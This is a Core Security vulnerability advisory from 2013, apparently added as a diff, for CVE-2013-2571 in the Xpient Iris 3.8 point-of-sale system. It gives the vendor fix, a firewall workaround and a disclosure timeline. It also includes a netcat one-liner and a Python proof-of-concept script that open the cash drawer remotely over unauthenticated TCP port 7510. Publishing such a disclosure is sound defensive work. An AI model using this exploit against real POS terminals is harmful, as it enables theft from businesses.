@@ -1,0 +1,226 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Xpient Cash Drawer Operation Vulnerability
+
+
+1. *Advisory Information*
+
+Title: Xpient Cash Drawer Operation Vulnerability
+Advisory ID: CORE-2013-0517
+Advisory URL:
+http://www.coresecurity.com/advisories/xpient-cash-drawer-operation-vulnerability
+Date published: 2013-06-05
+Date of last update: 2013-06-05
+Vendors contacted: XPIENT Solutions
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Input validation error [CWE-20]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-2571
+
+
+3. *Vulnerability Description*
+
+A security vulnerability was found in Xpient POS system running an
+instance of Iris 3.8 software [1]; the POS cash drawer could be remotely
+triggered to open if a malicious agent has access to the POS network and
+is allowed to send a crafted message to the POS terminal hosting the
+cash drawer. The malicious agent could be malware which operates from
+any device on the POS network or an unauthorized device connected to the
+physical POS network.
+
+No Authentication or encryption layer is required to exploit this
+vulnerability. As a result, the cash drawer opens and its content is
+physically accessible.
+
+
+4. *Vulnerable Packages*
+
+   . Iris 3.8 build 1052.
+   . Other versions are probably affected too, but they were not checked.
+
+
+5. *Non-Vulnerable Packages*
+
+   . Iris 3.8 build 1548 or higher.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+Xpient notifies that this vulnerability has been corrected in IRIS v3.8
+build 1548, notified their active customers of this concern and provided
+them with guidance. Security Bulletin XS130521, May 21st 2013.
+
+Enabling a software firewall (e.g. Windows Firewall) on the POS Terminal
+to deny incoming traffic from reaching the cash drawer functions on the
+terminal will also prevent remote attacks.
+
+For further information contact vendor via the official email address
+for product security inquiries which is: padss [at] xpient [dot] com.
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Matthew Bergin from
+Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+The analyzed POS system running an instance of Iris 3.8 build 1052 was
+found to be bound to several TCP ports. The services using these ports
+are proprietary to Xpient and do not run OSS code. One TCP port (7510)
+was accessible without any authentication or layer of encryption
+required to execute code which triggered specific functionality. This
+was abused in order to send a specific command to the service which
+would in turn cause the cash drawer peripheral to unlock and open
+revealing the contents.
+
+The command used consists of two integers separated with a single
+whitespace:
+
+/-----
+/bin/echo 1 1 || /bin/nc <POS-IP>: 7510
+-----/
+
+
+8.1. *Proof of Concept*
+
+The following Python script can be used to exploit this vulnerability.
+
+/-----
+#
+# Description: xpient pos v3.8 cash drawer release (xpient-poc.py)
+# Author: Level @ CORE Security Technologies, CORE SDI Inc.
+# Email: level () coresecurity com
+# CVE: CVE-2013-2571
+# CORE ID: CORE-2013-0517
+# Command: /bin/echo 1 1 | nc -vv <ip>:7510
+#
+# The contents of this software are copyright (c) 2013 CORE Security and
+(c) 2013 CoreLabs,
+# and are licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 (United States)
+# License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+#
+# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
+# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
+# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
+# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
+# THIS SOFTWARE.
+#
+
+import socket
+from sys import argv, exit
+from time import sleep
+
+def main():
+    if not len(argv) == 2:
+        print "Error: Wrong arguments."
+        print "Usage: xpient-poc.py <pos-ip>"
+        exit(1)
+    for i in xrange(0, 4):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((argv[1], 7510))
+        #trigger
+        sock.send('1 1\n')
+        sock.close()
+        sleep(1)
+    exit(0)
+    
+if __name__ == "__main__":
+    main()
+-----/
+
+
+9. *Report Timeline*
+
+. 2013-05-20:
+Core Security Technologies notifies the Xpient team of the vulnerability.
+
+. 2013-05-23:
+Vendor asks for additional information regarding this issue.
+
+. 2013-05-23:
+Core sends a draft advisory with technical details to Xpient team.
+Tentative publication date is set for Jun 18th, 2013.
+
+. 2013-05-24:
+Vendor requests to talk about the issue over the phone.
+
+. 2013-05-24:
+Core rejects this suggestion and asks for keeping all interactions
+tracked via e-mail.
+
+. 2013-05-31:
+Vendor notifies that they have recently become aware of this issue,
+developed a solution and notified their customers of this concern.
+Xpient sends the Security Bulletin XS130521 for reference and notifies
+that their Security Bulletins and patches are available to active users
+of Xpient software. Vendor requires to remove the Proof of Concept (PoC)
+and technical details from Core's report.
+
+. 2013-06-04:
+Core notifies that the advisory is re-scheduled for Jun 5th and will
+include the PoC since it gives the users a tool to assess the risks they
+are running and the effectiveness of possible countermeasures and
+workarounds.
+
+. 2013-06-05:
+Advisory CORE-2013-0517 is published.
+
+
+10. *References*
+
+[1] http://www.xpient.com
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
